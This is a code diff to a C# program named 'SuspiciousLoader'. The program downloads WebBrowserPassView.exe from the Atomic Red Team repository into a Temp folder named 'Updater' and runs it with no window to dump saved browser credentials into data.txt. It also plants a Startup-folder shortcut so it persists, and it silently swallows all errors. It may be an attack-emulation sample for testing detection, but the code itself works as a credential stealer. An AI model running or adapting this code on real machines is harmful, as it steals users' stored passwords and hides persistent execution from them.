@@ -2,7 +2,7 @@
 using System;
 using System.IO;
 using System.Net;
-using System.Reflection;
+using System.Diagnostics;
 
 namespace SuspiciousLoader
 {
@@ -12,48 +12,50 @@ namespace SuspiciousLoader
         {
             try
             {
-                // 1) Marker in Downloads
-                string downloads = Path.Combine(
-                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
-                    "Downloads"
-                );
-                string marker = Path.Combine(downloads, "marker.txt");
+                // 1) Marker in Temp
+                string tempBase  = Path.GetTempPath();
+                string marker    = Path.Combine(tempBase, "marker.txt");
                 File.AppendAllText(marker,
                     $"[SuspiciousLoader] ran at {DateTime.UtcNow:O}{Environment.NewLine}"
                 );
 
-                // 2) Create staging folder under AppData
-                string appData   = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                string updater   = Path.Combine(appData, "Updater");
+                // 2) Create staging folder under Temp\Updater
+                string updater   = Path.Combine(tempBase, "Updater");
                 Directory.CreateDirectory(updater);
 
-                // 3) Download WebBrowserPassView.exe into Updater
-                string wbpvUrl = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe";
-                string wbpvExe = Path.Combine(updater, "WebBrowserPassView.exe");
+                // 3) Download WebBrowserPassView.exe into that folder
+                string wbpvUrl   = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe";
+                string wbpvExe   = Path.Combine(updater, "WebBrowserPassView.exe");
                 using (var wc = new WebClient())
-                {
                     wc.DownloadFile(wbpvUrl, wbpvExe);
-                }
 
-                // 4) Create a Startup‐folder shortcut pointing at WebBrowserPassView.exe
-                string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                string link    = Path.Combine(startup, "Updater.lnk");
+                // 4) Immediately execute it to dump creds into data.txt
+                string dataTxt   = Path.Combine(updater, "data.txt");
+                var psiRun = new ProcessStartInfo
+                {
+                    FileName        = wbpvExe,
+                    Arguments       = $"/stext \"{dataTxt}\"",
+                    UseShellExecute = false,
+                    CreateNoWindow  = true
+                };
+                using (var proc = Process.Start(psiRun))
+                    proc.WaitForExit(15000);
 
-                // Use COM to build the .lnk
-                Type t = Type.GetTypeFromProgID("WScript.Shell");
-                dynamic shell = Activator.CreateInstance(t);
-                dynamic shortcut = shell.CreateShortcut(link);
+                // 5) Create Startup‐folder shortcut pointing at the same command for persistence
+                string startup   = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string linkPath  = Path.Combine(startup, "Updater.lnk");
+                Type shellType   = Type.GetTypeFromProgID("WScript.Shell");
+                dynamic shell     = Activator.CreateInstance(shellType);
+                dynamic shortcut  = shell.CreateShortcut(linkPath);
 
-                // Set properties: run wbpv.exe /stext "…\data.txt"
-                string dataTxt = Path.Combine(updater, "data.txt");
-                shortcut.TargetPath = wbpvExe;
-                shortcut.Arguments  = $"/stext \"{dataTxt}\"";
+                shortcut.TargetPath      = wbpvExe;
+                shortcut.Arguments       = $"/stext \"{dataTxt}\"";
                 shortcut.WorkingDirectory = updater;
                 shortcut.Save();
             }
             catch
             {
-                // Swallow all errors
+                // Silent
             }
         }
     }
